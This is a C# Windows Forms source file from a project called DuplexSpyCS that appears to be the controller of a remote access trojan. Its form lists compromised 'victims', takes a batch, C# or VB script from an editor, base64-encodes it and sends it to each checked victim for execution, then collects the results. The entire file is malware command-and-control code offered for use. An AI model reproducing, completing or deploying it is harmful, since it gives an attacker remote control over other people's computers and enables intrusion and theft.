using ICSharpCode.TextEditor;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmMultiRunScript : Form
    {
        private TextEditorControl editor = new TextEditorControl();

        private List<clsVictim> m_lsVictim { get; init; }
        private readonly string[] lvColumns =
        {
            "ID",
            "Result",
        };

        public frmMultiRunScript(List<clsVictim> lsVictim)
        {
            InitializeComponent();

            m_lsVictim = lsVictim;

            Text = $"MultiRunScript[{lsVictim.Count}]";
            StartPosition = FormStartPosition.CenterScreen;
        }

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (lsMsg[0] == "exec")
            {
                if (new string[] { "bat", "cs", "vb" }.Contains(lsMsg[1]))
                {
                    int code = int.Parse(lsMsg[2]);
                    string output = clsCrypto.b64D2Str(lsMsg[3]);


                }
            }
        }

        void ReqExecuteScript()
        {
            string script = editor.Text;
            string b64Script = clsCrypto.b64E2Str(script);

            foreach (ListViewItem item in listView1.CheckedItems)
            {
                clsVictim v = (clsVictim)item.Tag;
                v.fnSendCommand("exec|batch|" + b64Script);
            }
        }

        void setup()
        {
            //Add text editor control
            editor = new TextEditorControl();
            tabPage2.Controls.Add(editor);
            editor.Dock = DockStyle.Fill;

            //ListView initialization
            listView1.View = View.Details;
            listView1.CheckBoxes = true;
            foreach (string col in lvColumns)
            {
                ColumnHeader header = new ColumnHeader();
                header.Text = col;
                header.Width = 200;
                listView1.Columns.Add(header);
            }

            foreach (clsVictim victim in m_lsVictim)
            {
                ListViewItem item = new ListViewItem(victim.ID);
                item.Tag = victim;
                listView1.Items.Add(item);

                victim.m_listener.ReceivedDecoded += fnRecv;
            }

            listView1.Refresh();

            //TextEditor
            if (editor == null)
                editor = new TextEditorControl();

            tabControl1.TabPages[1].Controls.Add(editor);
            editor.Dock = DockStyle.Fill;
            editor.BringToFront();

            //Status label
            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";
        }

        private void frmMultiRunScript_Load(object sender, EventArgs e)
        {
            setup();
        }

        //Execute
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            ReqExecuteScript();
        }

        //Check all
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }
        //Uncheck all
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }

        private void frmMultiRunScript_FormClosed(object sender, FormClosedEventArgs e)
        {
            foreach (var victim in m_lsVictim)
                victim.m_listener.ReceivedDecoded -= fnRecv;
        }
    }
}
